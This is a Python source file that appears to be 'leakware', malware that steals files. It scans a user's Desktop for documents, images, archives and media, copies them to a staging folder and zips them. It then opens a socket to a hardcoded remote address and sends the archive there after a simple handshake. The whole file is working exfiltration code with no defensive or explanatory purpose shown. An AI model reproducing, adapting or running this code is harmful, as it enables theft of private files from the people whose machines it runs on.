import os
import socket
from zipfile import ZipFile

check = False

path = "C://Users/k4li/Desktop"
lw_path = "C:/Users/k4li/Desktop/LW_DIR"
zip_path = "C:/Users/k4li/Desktop"

try:
    os.mkdir(lw_path)
except:

    pass

file_ext = [".txt", ".pdf", ".png", ".jpg", ".docx", ".doc", ".xls", ".ppt", ".pptx", ".rar", ".zip", ".mp3", ".wmv",".mp4"]

def data_collection():
    global path, lw_path, file_ext, check

    for cp, dir, files in os.walk(path):
        for i in files:
            ext = os.path.splitext(i)
            if ext[1] in file_ext:
                with open(os.path.join(cp,i),"rb") as f:
                    try:
                        data = f.read()
                    except:
                        pass

                #print("Data read from",cp,i)

                with open(os.path.join(lw_path,i),"wb") as f:
                    try:
                        f.write(data)
                    except:
                        pass
    check = True

def convert():
    global zip_path
    files = []
    for cp,d,f in os.walk(lw_path):
        for i in f:
            x = os.path.join(cp,i)
            files.append(x)

    with ZipFile(os.path.join(zip_path,'leakware_files.zip'), 'w') as zip:
        for f in files:
            zip.write(f)

    zip_path = os.path.join(zip_path,'leakware_files.zip')

data_collection()

convert()

def read_chunks(file, chunk=1024):
    while True:
        data = file.read(chunk)
        if not data:
            break

        yield data

def header(file):
    name = os.path.basename(file)
    size = str(os.stat(file).st_size)

    return ("#?#" + name + "|" + size)

class Client:
    def __init__(self,host,port):
        self.s = None
        self.host = host
        self.port = port
        self.start(self.host,self.port)

    def start(self,host,port):
        try:
            self.s = socket.socket()
            self.s.connect((host,port))

        except socket.error as err:
            print("Connection Error: ",str(err))

    def send_data(self, data):
        if isinstance(data, bytes):
            pass
        else:
            data = data.encode()

        self.s.send(data)

    def recv_data(self):
        data = self.s.recv(1024)
        return data.decode()

    def close_all(self):
        self.s.close()
        print("Client: Connection Closed")


respo = None


if check == True:

    while True:
        try:
            cl = Client('192.168.0.105',9999)

            cl.send_data("READY")

            respo = cl.recv_data()

            break
        except:
            print("Retrying...")
            pass


    
    if respo == 'SEND':

            file = zip_path
            print(zip_path)
            head = header(file)
    
            cl.send_data(head)
            respo = cl.recv_data()
    
            if respo == 'OK':
                print(respo)
                with open(file, "rb") as f:
                    for content in read_chunks(f):
                        # print(content.decode())
                        # print("################")
                        #print("-----IN send---")
                        try:
                            cl.send_data(content)
                        except:
                            print("can't send: ", file)
                            continue

                print('File Sent successfully: ', file)
    

    









